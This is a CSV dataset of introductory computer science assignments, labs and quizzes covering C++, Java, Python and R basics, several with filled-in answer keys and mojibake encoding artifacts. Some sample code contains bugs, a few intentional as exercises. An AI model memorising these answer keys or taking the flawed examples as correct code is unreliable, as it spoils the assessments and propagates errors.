class,code,assessment_title,description
Computer Science I,1030,Algorthims,"Homework 1 Algorithm Declare a variable that represents velocity as a float because velocity can be measured down to the decimal and not just as a whole number. Declare a variable that represents acceleration as a float because, just like velocity, acceleration can be measured down to the decimal place also.Declare a variable for time which is represented in seconds as a float because time can be represented as a decimal.Declare a variable for displacement that is also a float and is found using the equation for displacement, which involves using your velocity, time, and acceleration variables that were declared earlier. Use cout to ask the user for the velocity which is in meters per second.Use cin so the user can put in a value for the velocity and save it in the velocity variable declared earlier.Use cout to ask the user for the acceleration which is in meters per second squared.Use cin so the user can put in a value for the acceleration and save it in the acceleration variable declared earlier. Use cout to ask the user for the time which is represented in seconds.Use cin so the user can input a value for the time and save it in the time variable that was declared earlier. For the displacement variable, set it equal to (velocity*time) + Â½(acceleration)(time)2. This will get you your displacement in meters.oExample Calculation: ï‚§Velocity = 2.52ï‚§Acceleration = 5.25ï‚§Time = 16.25ï‚§(2.52) (16.25) + Â½ (5.25) (16.25)2 ï‚§40.95 + 693.1640625ï‚§734.1140625 metersNext to get make sure that your answer rounds to the hundredths place use cout. precision (2) before your displacement equation. This will result in displacement being rounded to two decimal places. Use cout to read in a line stating what the displacement (which will be found using the displacement equation) is in meters.Return 0."
Computer Science I,1030,Intro to programming,"CSC141, Computer Science I Quiz 5 Name(print)________________________ Student Number_______________ Section number_________________ Part 1 (2 pts): Given the value of variable x=3, write down the evaluation value (true/false) of the expression. 1) ( F ) if (x>3 && (x<4 || x >6)) 2) ( F ) if (x>3 && x<4 || x >6) Part 2 (33 pts): 1) The following program will print out ( C ) x=90 if (x<60) System.out.println (â€œCase 1â€); else if (x < 80) System.out.println (â€œCase 2â€); else System.out.println (â€œCase 3â€); (a) Case 1 (b) Case 2 (c) Case 3 (d) Others 2) The following program will print out ( A ) x=90 if (x>60) System.out.println (â€œCase 1â€); else if (x < 80) System.out.println (â€œCase 2â€); else System.out.println (â€œCase 3â€); (a) Case 1 (b) Case 2 (c) Case 3 (d) Others 3) The following program will print out ( B ) x=90 if (x<60) System.out.println (â€œCase 1â€); System.out.println (â€œCase 2â€); (a) Case 1 (b) Case 2 (c) Others1 4) The following program will print out ( C ) x=90 if (x>60) System.out.println (â€œCase 1â€); System.out.println (â€œCase 2â€); (a) Case 1 (b) Case 2 (c) Others 5) The following program will print out ( D ) x=90; y=1; if ( x>60 ) y=2; if ( x < 80 ) y=3; else y=4; System.out.println (y); (a) 1 (b) 2 (c) 3 (d) 4 6) The following program will print out ( C ) x=60; y=1; if ( x>60 ) y=2; if ( x < 80 ) y=3; else y=4; System.out.println (y); (a) 1 (b) 2 (c) 3 (d) 4 7) The following program will print out ( C ) x=70; y=1; if ( x>60 ) y=2; if ( x < 80 ) y=3; else y=4; System.out.println (y); (a) 1 (b) 2 (c) 3 (d) 4 2 8) The following program will print out ( D ) x=80; y=1; if ( x>60 ) { y=2; if ( x < 80 ) y=3; else y=4; } System.out.println (y); (a) 1 (b) 2 (c) 3 (d) 4 9) The following program will print out ( A ) x=60; y=1; if ( x>60 ) { y=2; if ( x < 80 ) y=3; else y=4; } System.out.println (y); (a) 1 (b) 2 (c) 3 (d) 4 10) The following program will print out ( D ) x=60; y=1; if ( x>60 ) { y=2; if ( x < 80 ) y=3; } else y=4; System.out.println (y); (a) 1 (b) 2 (c) 3 (d) 4 3 11) The following program will print out ( B ) x=80; y=1; if ( x>60 ) { y=2; if ( x < 80 ) y=3; } else y=4; System.out.println (y); (a) 1 (b) 2 (c) 3 (d) 4 Part 3 (35 pts): 1) Scientists measure an objectâ€™s mass in kilograms and its weight in Newtons. If you know the amount of mass that an object has, calculate its weight in Newtons with the following formula: Weight = Mass x 9.8 Write a program that asks the user to enter an objectâ€™s mass, and then calculate its weight. If the object weighs more than 1,000 Newtons, display a piece of information on screen indicating that the object is too heavy. If the object weighs less than 10 Newtons, display a piece of information on screen indicating that the object is too light. You do not need to define a class or the main method, or import any classes. For this question, you should assume that all necessary classes (e.g., Scanner, Arrays) have been imported. Furthermore, assume that the following line precedes every question below, for you to use if you want: Scanner kb = new Scanner(System.in); Scanner kb = new Scanner(System.in); double w; double m; System.out.print(""Input a mass: ""); m = kb.nextInt(); w = m * 9.8; if (w > 1000) System.out.println(""Too heavy""); else if (w < 10) System.out.println(""Too light"");4 2) Write a program that asks the user to input a test score. The program should display a letter grade based on the following grading scheme. If the value of a grade is not a number between 0 and 100, show a piece information on screen: â€œPlease try againâ€. A -> 100-90 B -> 89-80 C -> 79-65 D -> 64-60 F -> 0-59. You do not need to define a class or the main method, or import any classes. For this question, you should assume that all necessary classes (e.g., Scanner, Arrays) have been imported. Furthermore, assume that the following line precedes every question below, for you to use if you want: Scanner kb = new Scanner(System.in); Scanner kb = new Scanner(System.in); System.out.print(""Input a test score: ""); int g = kb.nextInt(); if(g < 0 || g > 100) System.out.println(""Please try again.""); else if(g>=90) System.out.println(""A""); else if(g>=80) System.out.println(""B""); else if(g>=65) System.out.println(""C""); else if(g>=60) System.out.println(""D""); else System.out.println(""F"");5"
Computer Science I,1030,Calculation and Functions,"CSCI 1100 â€” Computer Science 1 Homework 1Calculations and FunctionsOverviewThis homework is a combination of what was supposed to be Homeworks 1 and 2, and is worth 70points toward your overall homework grade. There are three distinct parts to the assignment. Theinitial part explores how to submit homeworks for grading, including the types of error messagesto expect. The other two parts practice material on Python as a calculator from Lecture 2 and theuse of functions, as discussed in Lecture 3. All parts of this homework must be submitted on-lineusing the submission server by 11:59 pm on Wednesday, September 12 in order to receive full credit.Remember, time is measured according to the submission serverâ€™s clock, not yours, and anythingthat is a minute or more late is considered a day late.All submissions for the homework will be going through a Department of Computer Scienceweb server. You will log into this server, upload your Python programs, and view the results. Laterin the semester we may automatically grade part of your homework, but not now while we are justgetting started.You will either soon be receiving or have already received an email from root@cs.rpi.eduinforming you that you have an account on the RPI CS department machines where you cansubmit homework assignments. This will include a password. You are welcome to use this passwordthroughout the semester (it is pretty secure, but hard to remember), but you are encouraged tochange it. The email contains instructions on how to use ssh to log onto a department server andmake the change. The email also has a pointer to the websitehttp://www.cs.rpi.edu/twiki/view/LabstaffWeb/LabstaffSSHwith more detailed instructions. Note that you are only using this account for homework submis-sions, and it will disappear at the end of the semester.If you do not receive an email from labstaff@cs.rpi.edu by Thursday night (9/6), pleasesend email to this address.Once you have established the account, you are ready to submit homework solutions. However,you can work on Part 1 and Part 2 of the homework even before you work on the submission server.Also, there will be time available in lab next week to help students with submission issues.Part 0: Using the Submission ServerStart by creating a folder for CS 1 homework inside your dropbox and subfolder for HW 1. Fromthe course Piazza site under Homework 1 on the Resources page, download the file part0.py. Thissimple Python program to compute the surface area of a rectangular solid (the sum of the areasof the six rectangular faces) contains both syntax errors (two) and a semantic error. Before fixingthese errors we want you to start by just submitting the incorrect program to the on-line server tosee what happens. By the end of this part of the homework, you will fix both the syntax errorsand the semantic error.Please follow these steps:1. Look at part0.py in the Wing IDE (on your virtual machine) and, without making anychanges, attempt to run it (click the green triangle/arrow). It will complain of syntax error(s).Do NOT fix these errors yet. Instead, submit this to the homework server to see whathappens.2. To do this, using a web browser log onto the sitehttps://submit.cs.rpi.edu/submit.php?course=csci1100You will see three rows of radio buttons in the table for HW 1, one for each part of thehomework.Click on the button for Part 0, then click on the Choose File button, browse your file systemto part0.py, and click on Send File. The homework server will attempt to run this programusing Python. It will fail, of course, because of the syntax errors, and the server will generateoutput that looks like thisThis is what the server shows you when your program has syntax errors. Remember, Pythononly shows you the first error!3. Please find and fix the two syntax errors, making sure that the program runs on your virtualmachine using the Wing IDE. It would be best if you do not fix the semantic error yet.24. Submit the syntactically-correct version of part0.py to the homework server, again using thePart 0 button. (This illustrates the fact that you can resubmit the same homework multipletimes â€” we will grade your last submission!) The server will now be able to run your program.It will display your results side-by-side with the expected results, and you will be able to seeany discrepancies. Here is an example5. Finally, fix the semantic error in the program and resubmit, doing so until your answermatches ours. Once you do so, you will earn the full 10 points for part 0. Congratulations!Part 1This part is worth 30 points.Before getting started, practice writing Python expressions and assignment statements usingthe Python interpreter! If nothing else, repeat some of the problems we worked on during lectureto see if you can solve them yourself...For this part of the homework you are going to write one Python (.py) file that outputs theresults of several calculations. Your code should use variables, expressions, assignment statementsand print statements. You may write a function to make your code shorter, as discussed in Lecture 3,but while it is desirable it is not necessary in order to earn full credit. To make your code easier toread, your .py file should have blank lines separating the groups of calculations.The distances (in miles) of the planets to the sun and the diameters of the five planets closestto the sun are as follows:Planet Diameter DistanceMercury 3,032 35,983,610Venus 7,531 67,232,360Earth 7,926 92,957,100Mars 4,222 141,635,300Jupiter 88,846 483,632,000Write Python code that outputs the name â€˜Mercuryâ€™ and then outputs on each successive lineâ€¢ its distance to the sun relative to the distance of the earth from the sun,â€¢ its diameter relative to the earthâ€™s diameter,3â€¢ the time, in minutes, that light takes to travel from the sun to Mercury (use 186,000 milesper second as the speed of light), andâ€¢ Mercuryâ€™s volume relative to that of the earth.When you run the program (in the Wing IDE) the output should look something likeMercuryrelative distance 0.387099102704relative diameter 0.382538480949light time (minutes) 3.22433781362relative volume 0.0559790323342Repeat the calculations for Venus, Mars and Jupiter, outputting a blank line after the outputfor each planet. At this point, you can introduce a function if you wish to perform the calculationsfor a single planet and then call this function once for each of the four planets.The final output from your program should be the average distance of the five planets from thesun and the average diameter of the planets. You may use integer arithmetic to complete thesecalculations.The complete output from your program should look very close toMercuryrelative distance 0.387099102704relative diameter 0.382538480949light time (minutes) 3.22433781362relative volume 0.0559790323342Venusrelative distance 0.723262236021relative diameter 0.950164017159light time (minutes) 6.02440501792relative volume 0.857477483265Marsrelative distance 1.52366306608relative diameter 0.532677264698light time (minutes) 12.6913351254relative volume 0.151144546868Jupiterrelative distance 5.20274406151relative diameter 11.209437295light time (minutes) 43.3362007168relative volume 1408.48243619Average planetary distance in miles is 164288074Average planetary diameter in miles is 22311In order to complete Part 1 of the HW 1, please submit the file (e.g. part1.py) containing yoursolution to the submission server. Be sure to submit for Part 1, which is the second submission lineon the website. Do not submit anything other than your single Python file!4Final note: You could write a Python program that simply prints the output provided above.It would start with something likeprint ""Mercury""print "" relative distance 0.387099102704""print "" relative diameter 0.382538480949""print "" light time (minutes) 3.22433781362""print "" relative volume 0.0559790323342""print """"etc. If you do this, you will earn 0 points for the assignment. You must let Python do all of thecalculations. To illustrate, if we suddenly realized that we had mistyped Earthâ€™s distance from thesun, you should have to change only one line of your code and the rest of your program shouldwork correctly! The same is true of Part 2.Part 2This part is worth 30 points.Before getting started, practice writing Python functions using the Python interpreter! Ifnothing else, repeat some of the problems we worked on during lecture to see if you can solve themyourself...The (fictional) Acme computing and social networks company has large data centers distributedthroughout the world and these centers consume a large amount of energy each year. Environmentalorganizations would like Acme to reduce its carbon footprint, and pay in â€œcarbon creditsâ€ for thepollution it produces.â€¢ Each data center is formed by a sequence of standard shipping â€œcontainersâ€, each containing1,160 servers, and each requiring about 250 kilowatts of energy. A common measurement ofenergy usage is to multiple the kilowatts times a unit of time, typically an hour, yielding thekilowatt-hour. As a sanity check to make this clear, these numbers imply that a containeruses 250 Ã— 24 Ã— 365 â‰ˆ 2 million kilowatt-hours per year. To give a sense of the scale of thisnumber, an efficient refrigerator uses about 500 kilowatt-hours of energy per year.â€¢ Each data center uses about 200 containers, and Acme has about 15 data centers.â€¢ The unnamed environmental organization wants Acme to pay $12 per ton of carbon used,and Acme consumes about 0.0006 tons of carbon per kilowatt-hour.Using this information, write a Python program to calculate and output how much enery Acmeuses for the year 2012 and how much Acme must pay in carbon credits. Assuming Acme adds 4containers to each center in each year and adds 2 data centers in 2013, 5 in 2014, and 3 in 2015,how much must Acme pay in carbon credits each year?The central part of your program is that you must write a function that takes the number ofcenters that Acme has and the number of containers per center and calculates the amount of moneyAcme must pay.The output from your program should beIn 2012 Acme should pay $ 47304000.0In 2013 Acme should pay $ 54683424.0In 2014 Acme should pay $ 72154368.0In 2015 Acme should pay $ 83570400.05Please submit your program using the submission server, being sure to select Part 2, which isthe third row of submissions. Do not submit anything other than your single Python file!A Note on GradingMost of the points for this assignment will be given just for getting the calculations and outputcorrect. As we progress through the semester, however, the quality and clarity of your programswill become increasingly important. To practice this, please try to choose variable names that havemeaning in regards to the calculations your code is performing and make your code as readable aspossible by introducing blank lines between important sections of code."
Computer Science I,1030,Variables and Arithmetic Operations,"CS161: Introduction to Computer ScienceHomework Assignment 3Variables and Arithmetic OperationsThe purpose of this homework assignment is to give you practice,â€¢ Using variables of primitive type and arithmetic operatorsâ€¢ Casting between int and doubleProgramming ProblemsCreate a Java class named ArithmeticOperations with a main() method. All of your code should be insideof the main() method. Use comments and whitespace to organize your code and make it clear where eachexercise begins.1. Create a variable to hold the radius of a sphere. Use the variable to compute the volume of the sphereand then print the volume to the screen. You can compute the volume using the formula:V =43Ï€ r3where r is the radius and pi is 3.1415.2. Create a variable to hold some amount of US money. Then compute the fewest number of each billand coin needed to represent that amount. (Assume that the highest bill is a $10 dollar bill.) Here isan example. If we have $47.63, then you would needâ€¢ 4 ten dollar billsâ€¢ 1 five dollar billâ€¢ 2 one dollar billsâ€¢ 2 quartersâ€¢ 1 dimeâ€¢ 0 nicklesâ€¢ 3 penniesYour code should print the starting amount of money and the breakdown of coins and bills. You shouldnot hardcode your program to work with only a certain amount of money. If the original amount ofUS money in the variable is changed, your code should still work.3. Ancient Babylonians (1800-1600 BC) did not count in a base-10 system like we do today. Instead, theyused a base-60 system. In fact, our present system of time (60 seconds in a minute and 60 minutes inan hour) comes from the ancient Babylonians.1Another interesting fact is that ancient Babylonians wrote numbers without using any decimal points!For example, if we didnâ€™t use decimal points then the digits 3, 6, and 2 could represent any of thefollowing numbers:36236.23.62.362In general, these digits could represent any number of the form3 âˆ— 10n + 6 âˆ— 10nâˆ’1 + 2 âˆ— 10nâˆ’2Stop and make sure you understand how to use this equation to compute each of the numbers above.In particular, what value of n would we plug in to get the number 362? What value of n would weplug in to get the number 36.2?This is exactly how the ancient Babylonians wrote their numbers except they used 60 instead of 10.Suppose we had the â€œdigitsâ€ 2 and 20. This could represent any number of the form:2 âˆ— 60n + 20 âˆ— 60nâˆ’1Create variables to hold two â€œdigitsâ€ like 2 and 20. Then compute what number we would get forn = âˆ’1, 0, 1, 2. Print each of these numbers to the screen. For example, for 2 and 20, we would have:n = -1 2 âˆ— 60âˆ’1 + 20 âˆ— 60âˆ’2 = 2/60 + 20/3600 = 0.0388n = 0 2 âˆ— 600 + 20 âˆ— 60âˆ’1 = 2 + 20/60 = 2.33n = 1 2 âˆ— 601 + 20 âˆ— 600 = 2 âˆ— 60 + 20 = 140n = 2 2 âˆ— 602 + 20 âˆ— 601 = 2 âˆ— 3600 + 20 âˆ— 60 = 8400.00Again, you should not hardcode your solution to only work for certain numbers. If I change the digitsfrom 2 and 20 to other values, your program should still output the correct values.GradingThis is a list of some of things I will be checking on your homework. It is not exhaustive but it gives you ageneral idea of what a completed assignment entails.You have a Java classes named ArithmeticOperationsYou have a Javadoc comment at the top with a brief description (written in full English sentences),your name, and the dateAll variable names are lowercasedYou have inline comments to explain any non-obvious parts of your codeYour code correctly computes the volume of a sphereYour code correctly prints the fewest number of bills and coins neededYour code correctly prints the values for n = âˆ’1, 0, 1, 2Your code is not hardcoded to work for only certain valuesYou correctly renamed and then zipped your submission2Here is an example of what my program prints out:Submitting your assignmentPlease make sure to rename your folder before zipping. You should rename your folder using both your firstand last name. For example, hw3 Jane Doe.Submit your zipped folder via Canvas."
Computer Science I,1030,While Loops,"Lab 6 - CMPS 1043- Computer Science IWHILE LoopsObjectives: Demonstrate use of while loops in a variety of scenarios:1) Counting loop 2) Sentinel loop 3) Check for â€œrandomâ€ conditionWHILE: The while loop is a programming construct which executes a set of statements repeatedlywhile a stated condition is true.while (condition) // NOTE: no semicolon here{Statement 1; // Place one or more statements between the brackets.... // Statements between brackets are referred to asStatement n; // the BODY of the loop}Execution: The (condition) is tested.ï‚· If it is false, program execution skips all commands in the brackets and continues with theinstructions following the closing bracketï‚· If it is trueo Execute the statements in the body of the loopo Return to the â€œwhileâ€ statement, retest the condition and repeat these stepsNotes on use of WHILE Loop:ï‚· Variables in (condition)must be initialized prior to the while statementï‚· At least one of the variables in the condition MUST change in the body of the loopWHILE as a counting loop â€“ Used to perform the body of the loop a pre-determinednumber of times. The following loop will execute the body of the loop 10 times. Type in and executethe following code.Count = 1;while (Count <=10) // NOTE: no semicolon here{cout << â€œcount is â€œ << Count << â€˜\nâ€™;Count += Count; // increment counter until reaches 11}cout<< â€œOutside the loop now. Count has final value of â€ << Count << â€˜\nâ€™;Consider the following problem: Enter 7 temperatures from the keyboard â€“ each on representing adaily temperature for the previous week. Sum the 7 values then calculate and print the averagetemperature for the week. Modify the program above to solve this problem. Before you do, considerthe following issues.1) What variables will you need for input and output?2) Which operations will you perform one time (outside the body of the loop) and which operationsare performed 7 times (inside the body of the loop)?Now, modify the program above to solve the problem. Execute with the following 7 data items:82 75 61 73 89 90 69 -- Average is 77WHILE checking for a sentinel â€“ A sentinel is a data value that marks the end of a dataset. Usually is a value that is different from the legitimate data values. If you have a rather large dataset which changes in size over time, it may be easier to place a sentinel value at the end for the dataset to indicate the end rather than trying to count the number of data items and use a counting loop.Example: Suppose the data values are personâ€™s ages. Legitimate data values are positive values soa sentinel value could be a negative value. The sentinel value is usually ignored, not processed.Statement of Problem: Read and process a set of values UNTIL a negative value is read.Sample Data Set: The following data set represents 8 valid data items followed by a sentinel.23 45 53 29 16 85 23 66 -25Consider the following problem: Read and sum a set of integers until a negative value is read. Donot include the negative value (sentinel) in the sum. Type in and execute the program.Sum = 0; // initialize sum variablecin >> DataVal; // read the first data itemwhile (DataVal >= 0) // check for a negative value{Sum += DataVal;cin >> DataVal; // read data item to update condition}cout<< â€œOutside the loop now. The sum of the values is â€ << Sum << â€˜\nâ€™;Modify the above code to calculate the average of the numbers you are reading. You MUST makethe code count the number of values for the division. You CANNOT count by hand and type in thenumber.WHILE checking for a â€œrandomâ€ condition â€“ A while loop can execute until anystated condition is reached, not really â€œrandomâ€ necessarily, but a wide variety.Examples:1. Read integers as input stopping when the total value of integers input is greater than 100.2. Read characters as input. Repeat as long as the user enters â€˜Yâ€™ or â€˜yâ€™ but stops with any othercharacter.3. Ask the user to enter a 1, 2, 3, or 4. Repeat as long as they do; Stop if any other value isentered.4. Just about any other condition you can think of!Type in and execute the following solution to Example 1.cin >> DataVal;Total = DataVal // read the first data itemwhile (Total <= 100) // check for a negative value{cin >> DataVal; // read data item to update conditionTotal += DataVal;}cout<< â€œOutside the loop now. The final sum of the values is â€ << Sum <<â€˜\nâ€™;Modify the above program to print out each value as it is read and also count the number of valuesread and print it out with the total.ASSIGNMENT: Joe just graduated college and has been offered his first real job as a widgetdesigner at Widgets USA, Inc. He is disappointed in the offered beginning salary; only $20,000 peryear. But he is promised a 10% raise each year. Other job opportunities offer more to start, but haveno promised raises. To help Joe decide, print out a table of his new salary each year until his salaryreaches or exceeds $50,000. (How many years will it take?) The table is to look as follows. Printyour output to a file then turn in the print-out.Year Salary----------------------1 $ 20,000.002 $ 22.000.00"
Computer Science I,1030,Programs,"Computer Science I: Quiz 1 (Programs 4, 6)Last: _______________________ , First: ________________________1) (10 pts) In program #4 (maze), the input was a grid of size R x C, indicating a starting square,blocked squares and squares to travel through. The goal of the assignment was to determine theshortest number of moves to get to the edge of the grid (in the assignment marked by the '~'character.) In terms of R and C, with proof, determine the run time of the posted solution. Pleaseclearly justify your answer.Run time = _________________2) (5 pts) In the posted solution to program #4 (maze), the queue stored each grid location (orderedpair) as a single integer. When necessary, a single integer that was dequeued was ""converted"" intotwo separate values, x and y, representing the row and column of the desired square in the grid.Show that you understand this conversion by doing it for the following case: Let R = 20, thenumber of rows in the grid and C = 30, the number of columns in the grid. What is the row andcolumn of the grid square designated by the integer 379? (Yes, you have to do some arithmetic onyour own...) Note: the very first row is row 0 and very first column is column 0.Row = ___ , Column = ___3) (5 pts) In the posted solution for program #4 (maze), a queue is used. Each item in the queuerepresents a reachable grid square from the starting point. For each of these grid squares, thesolution calculates the shortest distance from the starting point to the grid square. At any givenpoint in time while the code is running, what is the largest difference between the distance fromthe starting point to two different grid squares that are simultaneously in the queue? Give proof ofyour answer.Largest difference = ________4) (5 pts) The function below is in the extra credit version of the posted solution to program #6(boggle). Comments have been removed and the name of the function has been changed. Whatpurpose does this function serve and why was it necessary in the context of this extra creditsolution?void function(trie* dictionary) {if (dictionary != NULL) {dictionary->inGrid = 0;int i;for (i=0; i<26; i++)function(dictionary->nextLetter[i]);}}5) (5 pts) Consider the following solveIt function written below. It has been modified from thesolution posted for program #6 (boggle). (Note: in addition, the name of the trie was modifiedfrom dictionary to words so lines didn't wrap in the Word doc of this quiz.) If we were to use thisfunction instead of the one in the posted solution, how does it assume the rules of the game havechanged?void solveIt(char prefix[], int curX, int curY, char board[][SIZE],trie* words) {int curLen = strlen(prefix);if (isWord(prefix, words))printf(""%s\n"", prefix);if (!isPrefix(prefix, words)) return;int i;for (i=0; i<NUMDIR; i++) {if (inbounds(curX+DX[i], curY+DY[i])) {prefix[curLen] = board[curX+DX[i]][curY+DY[i]];prefix[curLen+1] = '\0';solveIt(prefix, curX+DX[i], curY+DY[i], board, words);prefix[curLen] = '\0';}}}6) (10 pts) If we were to remove the lineif (!isPrefix(prefix, words)) return;from the solveIt function in the posted solution to program #6 (boggle), then the run time of itwould be prohibitive. Clearly explain why this line of code greatly speeds up the run time of thealgorithm. Will it speed up the algorithm equally for all input grids? (Assume the input dictionaryis the same as the one posted with the solution.) Why or why not?"
Computer Science II,1040,GDD Compiler,"COSC 220 - Computer Science IILab 2Dr. Joe Anderson14 February 20201 Objectives1. Develop a familiarity with the GNU/Linux operating system2. Use the GCC compiler to compile more complex C++ programs3. Practice using C++ classes, constructors, and arrays4. Practice using objects and references to objects2 Tasks1. Use three separate files to write the code for this lab: payroll.h, payroll.cpp, and main.cpp2. In payroll.h, design a PayRoll class that has private data members for an employees name, hourlypay rate, and number of hours worked.(a) Use the following header file template to make use of precompiler macros to avoid double decla-ration errors:#ifndef PAYROLL_H#define PAYROLL_Hclass PayRoll{// your class prototypes here};#endifThe #ifndef, #define, and #endif commands are the pre-compiler macros that get â€œexecutedâ€at compile time, and will only produce the inner c++ code once, no matter how many times aproject uses #include ""payroll.h"".(b) Leave all methods undefined in the header file. Use payroll.cpp to define the class methods.i. You will need to use #include ""payroll.h"" at the top to include the prototypes.ii. Your methods will need to be defined with appropriate scope, e.g./** Calculate and return the total pay for* this employee*/1double PayRoll::getPay() {// implementation here}(c) Add a constructor to take the name and pay rate (dollars per hour) as arguments.(d) Add public methods to:i. Set the number of hours workedii. Calculate and return the total pay, based on the employees rate and the number of hoursworked(e) Add a public method to print all the data for the employee in a nice format, including total pay3. In the main.cpp file, declare and fill an array of seven PayRoll objects (with hard-corded name andpay rate)(a) You will need to #include your PayRoll header file at the top.4. The program should ask the user for the number of hours each employee has worked and will thendisplay the amount of gross pay each has earned.5. To compile the code, you will need to need to pass both payroll.cpp and main.cpp to g++ in somefasion.(a) Example 1: This will compile and link the code all at once into the binary called maing++ main.cpp payroll.cpp -o main(b) Example 2: This will compile each file separately into object files, then link them into a binarycalled maing++ -c payroll.cppg++ -c main.cppg++ main.o payroll.o -o main(c) As your programs become more complex, the second option will save lots of time when you onlyneed to re-compile some parts of the code, but not all of it. We will see later how to gain thisadvantage without having to use so many commands!6. Write a Makefile to automate the above compilation process. Include this file with your other sourcefiles for submission.7. Input Validation: Do not accept values greater than 60 for the number of hours worked.8. Once all hours have been entered, display each employeeâ€™s name and total wages for that week.9. Repeat the above four steps, but using an array of pointers to PayRoll objects.10. Use the sizeof operator to compare the sizes of the arrays, what is the difference and why?11. Use the addresses of the allocated data to make some claims about where in memory your variousdifferent PayRoll objects are with respect to each other (there will be fourteen total objects createdby the end).12. Be sure to comment your code appropriate, and answer the above questions in a separate text documentor in a block comment in main.cpp.23 SubmissionUpload your project files to MyClasses in a single .zip file.Turn in (stapled) printouts of your source code, properly commented and formatted with your name,course number, and complete description of the code.Also turn in printouts reflecting several different runs of your program (you can copy/past from theterminal output window). Be sure to test different situations, show how the program handles erroneousinput and different edge cases."
Computer Science II,1040,C++,"Computer Science II â€” CSci 1200Homework 1This two-part homework explores the background and review material cov-ered in Lectures 1 and 2. Part 1 is a set of short problems, similar to problemsthat might appear on a test. Part 2 is a short programming problem. Theseproblems are not particularly difficult. Students who feel uncomfortable abouttheir programming background should view this as an opportunity to gaugetheir current skills. Programming assignments will become more challengingsoon, so if you struggle with this one, you should work hard to practice andcatch up.Solutions to the problems in Part 1 must be turned in during class on Fri-day, September 9. Printouts and hand-written solutions are both acceptable.Electronic submissions will NOT be accepted, and late homework (for Part 1)will NOT be accepted. Put your name and lab section number on the top ofthe first page.Solutions to the programming problem in Part 2 are due electronically by11:59:59pm on Thursday, September 8th. The standard rules about latehomework submissions (see the course syllabus) apply.Part 11. (10 points) What is the output of the following program, which is sup-posed to compute the average, max and min of an array of numbers? Ex-plain why this output occurs and give a small set of changes to the codeto fix it. Do not fix the code by changing its structure; in other wordsthere must be a for loop and a while loop in the stats calculationfunction, and the while loop must count backwards.#include <iostream>using namespace std;voidstats_calculation( float values[], int & n, float & max_value,float min_value, float & avg ){// Find the average valuefloat sum = values[0];for ( int i=0; i<n; ++i )sum += values[n];avg /= n;// Find the maximum and minimum values.min_value = values[n-1], max_value = values[n-1];while ( n > 0 ){--n;if ( values[n] > max_value ) max_value = values[n];else if ( values[n] < min_value ) min_value = values[n];}}int main(){// Initialize an array in order to test the function. The size of// the array (6) is automatically determined from the number of// values in the list.float a[] = { 12.3, 15.4, 1.5, 7.8, 2.3, 8.9 };int size = 6;float min_value = 0, max_value = 0, average = 0;stats_calculation( a, size, max_value, min_value, average );cout << ""Here are the values: "";for ( int i=0; i<size; ++i ) cout << a[i] << "" "";cout << â€™\nâ€™;cout << ""average = "" << average << â€™\nâ€™<< ""max = "" << max_value << â€™\nâ€™<< ""min = "" << min_value << â€™\nâ€™;return 0;}While it is clearly possible for you to create a program file containing thiscode and then compile and execute the program, you will not have theluxury of doing this on a test. You should practice by studying the codecarefully yourself first and trying to determine the answers. This is a goodskill to develop.2. (5 points) What is the output of the following program?#include <iostream>using namespace std;int main(){int x=5, y=4;float a[3] = {1.0, 2.0, 3.0};if ( x > y ){float y =1.0;2int a =6;cout << ""x = "" << x << "", y = "" << y << "", a = "" << a << endl;x = 2;}cout << ""x = "" << x << "", y = "" << y << "", a[0] = "" << a[0] << endl;return 0;}3. (10 points) For each of the two functions in the following code, givean order notation count of the number of operations it requires. Justifyyour answer briefly. For an additional 5 points extra credit, rewrite thesecond function so that it has a better order notation estimate, and givethis estimate.// Count the number of entries in an array that have both an even// index (subscript) and an even value.intcount_evens( int arr[], int n ){int count = 0;for ( unsigned int i=0; i<n; i+=2 )if ( arr[i] % 2 == 0 ) ++count;return count;}// Given an array of floats, form an array of sums. Entry 0// in the array of sums is the addition of all values in the// array. Entry 1 is the addition of values in locations// 1..n-1. In general, entry i is the addition of the values// in locations i..n-1.voidsubsequence_sum( float arr[], int n, float sums[] ){for ( int i=0; i<n; ++i ){sums[i] = 0.0;for ( int j=i; j<n; ++j )sums[i] += arr[j];}}Part 2: InstructionsThis program is worth 40 points toward your homework grade.3Write a program that reads in a set of circles and determines if any of thecircles intersect. This is a simple example of the kinds of problems that must besolved in graphics and game software. The input to the program, via std::cin,will be an integer giving the number of circles (at most 100) and then a listof circles, one per line of input. Each circle will be specified by 3 floats givingthe x and y values of the center of the circle and the radius of the circle. Theoutput of the program will be all pairs of intersecting circles, with the count ofthe number of intersections at the end. When you output an intersection, youneed only specify the indices of the two intersecting circles. (The first circleinput is index 0.)Here is an example of the input:51 2 5-2.5 3 87 9.1 315.4 4 20.5 0.5 13Here is the resulting output from my program0 intersects 10 intersects 41 intersects 42 intersects 4Number of intersections = 4You should make the format of your output exactly like mine â€” this willsubstantially aid the TAs in grading.You will need three arrays to represent the circles, one for the x coordinates,one for the y coordinates and one for the radii. (Soon we will see a muchbetter way to represent these.) You should start by writing and testing a simplefunction that determines if two circles intersect â€” i.e. if any part of the regionenclosed in one circle is contained in the other. (We will not give you the methodfor doing this â€” you should figure it out for yourself.) This function should take6 parameters â€” the center x and y and the radius of each circle.You may (or may not) find the function sqrt useful. You get access to thisfunction by adding#include <cmath>at the start of your program, just as we did in Lab 1."
Computer Science II,1040,Matrix arrays,"Computer Science II January 16th, 2020 Quiz 2 ScoreName: Solution1. Fill in the blanks that will reflect the output in R, for the commands given below:> a = 5 | 4> b = !3> x = c(0, 5, 3, 7);y = c(0, 2, 8, 7);u = x[(x>y) & (x>4)]> A = matrix(1:8,nrow= 2)> B = matrix(1,3,4)> a[1] TRUE> b[1] FALSE> u[1] 5> A[,1] [,2] [,3] [,4][1,] 1 3 5 7[2,] 2 4 6 8> B[,1] [,2] [,3] [,4][1,] 1 1 1 1[2,] 1 1 1 1[3,] 1 1 1 1"
